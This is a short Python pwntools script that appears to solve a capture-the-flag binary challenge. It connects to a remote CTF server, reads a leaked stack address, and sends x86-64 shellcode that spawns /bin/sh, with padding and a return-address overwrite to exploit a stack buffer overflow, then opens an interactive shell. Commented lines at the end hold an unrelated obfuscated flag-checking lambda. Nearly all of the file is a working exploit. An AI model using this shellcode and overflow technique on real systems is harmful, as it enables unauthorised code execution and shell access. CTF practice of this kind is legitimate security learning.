from pwn import *

# r = process('./stackshellcode.dms')
r = remote('ctf99.cs.ui.ac.id', 9126)
r.recv(28)

shellcode = b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'
buf = b'A' * (400 - len(shellcode))
ebp = b'A' * 8
buffer_addr = int(r.recvline(14).strip(), 16)

print(hex(buffer_addr))
payload = shellcode + buf + ebp + p64(buffer_addr)

r.sendline(payload)
r.interactive()

# (lambda x: print('Congratz, here is your flag: COMPFEST12{' + x + '}') if zzz else print('Nope'))(input().lower())

# xxx = all([i in __import__('string').ascii_lowercase[-1:]+__import__('string').ascii_lowercase[:-1] for i in a])
# ccc = (lambda b: ''.join([chr((ord(i)-97+1+(1^2))%26+97) for i in b]))(a)
# zzz = (lambda a: int(ccc, 36) if xxx else -1)(x) == 16166842727364078278681384436557013 